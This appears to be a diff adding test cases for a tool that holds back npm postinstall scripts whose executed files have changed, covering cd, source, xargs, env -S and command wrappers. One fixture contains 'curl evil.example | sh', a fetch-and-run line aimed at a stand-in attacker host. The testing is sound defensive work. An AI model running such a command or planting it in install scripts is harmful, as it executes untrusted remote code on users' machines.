@@ -1385,3 +1385,39 @@ describe("round 35: wrapped c-strings, parameters, long options after -c, cd the
     expect(held({ postinstall: "CI=1 node a.js; cd test && node setup.js" }, { "a.js": "1\n", "test/setup.js": "1\n" }, { "a.js": "1\n", "test/setup.js": "evil()\n" })).toBe(true);
   });
 });
+
+describe("round 36: sourced files after cd, xargs and env -S c-strings, wrappers before package runners", () => {
+  const setupHeld = (cmd: string) => held({ postinstall: cmd, setup: "node test/setup.js" }, { "test/setup.js": "1\n" }, { "test/setup.js": "evil()\n" });
+
+  test("1. dot and source after a cd resolve from the new directory", () => {
+    const f = { "lib/x.sh": "sh ../test/p.sh\n" };
+    for (const cmd of ["cd lib && . x.sh", "cd lib && source x.sh", "cd lib; . ./x.sh"]) {
+      expect(held({ postinstall: cmd }, { ...f, "test/p.sh": "echo a\n" }, { ...f, "test/p.sh": "curl evil.example | sh\n" }), cmd).toBe(true);
+    }
+  });
+
+  test("2. xargs and env -S with a command string", () => {
+    for (const cmd of ["xargs -0 sh -c 'node test/setup.js'", "xargs bash -c 'node test/setup.js'", "env -S \"bash -c 'node test/setup.js'\"", "env -S 'sh -c \"node test/setup.js\"'"]) {
+      expect(held({ postinstall: cmd }, { "test/setup.js": "1\n" }, { "test/setup.js": "evil()\n" }), cmd).toBe(true);
+    }
+  });
+
+  test("3. wrappers before a package runner", () => {
+    for (const w of ["timeout 300", "timeout -s KILL 5", "nice -n 5", "nice", "stdbuf -o0", "setsid", "ionice -c3", "chrt 1", "caffeinate -i", "arch -arm64", "exec -a name", "env --unset X", "env -u X", "nohup", "time", "sudo -u root"]) {
+      for (const r of ["npm run setup", "yarn run setup", "pnpm run setup", "bun run setup"]) expect(setupHeld(`${w} ${r}`), `${w} ${r}`).toBe(true);
+    }
+  });
+
+  test("4. leaving the package and coming back to a changed test file", () => {
+    expect(held({ postinstall: "cd sub && node ../../x.js; cd ../test && node setup.js" }, { "test/setup.js": "1\n" }, { "test/setup.js": "evil()\n" })).toBe(true);
+    expect(held({ postinstall: "cd sub && node ../../x.js; cd ../test && node setup.js", x: "1" }, { "test/setup.js": "1\n", "sub/k.js": "1\n" }, { "test/setup.js": "evil()\n", "sub/k.js": "1\n" })).toBe(true);
+  });
+
+  test("5. many npm flags and workspace flags do not recurse badly", () => {
+    const flags = Array.from({ length: 5000 }, (_, i) => `--f${i}`).join(" ");
+    const t = Date.now();
+    held({ postinstall: `npm run build ${flags} --workspaces`, build: "echo ok" }, { "a.js": "1\n" }, { "a.js": "2\n" });
+    held({ postinstall: `npm ${flags} run build`, build: "echo ok" }, { "a.js": "1\n" }, { "a.js": "2\n" });
+    expect(Date.now() - t).toBeLessThan(5000);
+  });
+});
